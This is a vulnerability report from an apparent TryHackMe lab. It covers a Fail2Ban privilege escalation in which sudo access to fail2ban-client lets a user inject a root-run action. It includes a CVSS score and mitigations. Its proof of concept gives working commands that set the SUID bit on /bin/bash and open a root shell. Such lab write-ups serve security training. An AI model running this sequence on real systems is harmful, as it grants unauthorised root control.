# 📝 Vulnerability Report

## 🔖 Vulnerability Title
**Fail2Ban Privilege Escalation via Arbitrary Action Injection**

## 🧩 Vulnerability ID
THM-MAG-PE-001

## 📄 Description

A misconfiguration in the Fail2Ban service allows an unprivileged user to inject arbitrary actions into an active jail. Because Fail2Ban is running as root, any injected command will be executed with root privileges. This enables local privilege escalation, including setting the SUID bit on binaries such as `/bin/bash`, thereby allowing the attacker to gain a persistent root shell.

## 📊 CVSS v3.1 Score

| Metric | Value |
|--------|-------|
| Attack Vector | Local |
| Attack Complexity | Low |
| Privileges Required | Low |
| User Interaction | None |
| Scope | Unchanged |
| Confidentiality | High |
| Integrity | High |
| Availability | High |
| **Base Score** | **7.8 (High)** |

## 🧪 Proof of Concept (PoC)

```bash
# Step 1: List jails
sudo /usr/bin/fail2ban-client status

# Step 2: Choose a jail (e.g., "asterisk") and inspect actions
sudo /usr/bin/fail2ban-client get asterisk actions

# Step 3: Add a malicious action
sudo /usr/bin/fail2ban-client set asterisk addaction evil

# Step 4: Set payload to gain root
sudo /usr/bin/fail2ban-client set asterisk action evil actionban "chmod +s /bin/bash"

# Step 5: Trigger the payload
sudo /usr/bin/fail2ban-client set asterisk banip 1.2.3.5

# Step 6: Use the SUID shell to get root
/bin/bash -p
```

## 💥 Impact

An attacker with access to a low-privileged user account can escalate privileges to root without user interaction. This leads to full system compromise, including reading or modifying any file, installing rootkits, or maintaining persistent access.

## 🛡️ Recommendation

- Restrict access to `fail2ban-client` using proper file permissions or sudoers configuration.
- Disable dynamic jail/action manipulation from non-admin users.
- Run Fail2Ban as a dedicated non-root user where possible (using privilege separation).
- Use AppArmor or SELinux to restrict Fail2Ban's access to sensitive system binaries.
- Regularly audit Fail2Ban jails and custom actions for tampering.

## 📌 References

- [Fail2Ban Official Documentation](https://www.fail2ban.org/wiki/index.php/Main_Page)
- [TryHackMe – Magnus Billing](https://tryhackme.com/room/magnusbilling)
